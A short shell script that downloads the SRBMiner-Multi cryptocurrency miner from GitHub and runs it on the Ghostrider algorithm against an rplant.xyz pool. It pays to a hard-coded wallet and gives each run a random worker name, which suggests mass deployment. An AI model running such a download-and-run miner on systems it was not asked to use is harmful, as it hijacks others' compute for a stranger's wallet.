#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.6/SRBMiner-Multi-0-9-6-Linux.tar.xz  
tar -xvf SRBMiner-Multi-0-9-6-Linux.tar.xz  
./SRBMiner-Multi-0-9-6/SRBMiner-MULTI --algorithm Ghostrider --pool stratum-eu.rplant.xyz:17075 --tls true --wallet BfGQwxf8a2qua876YMuDj881TPU1LYVE9B.$(echo $(shuf -i 10000-99999 -n 1)-Maho) --password x --keepalive true
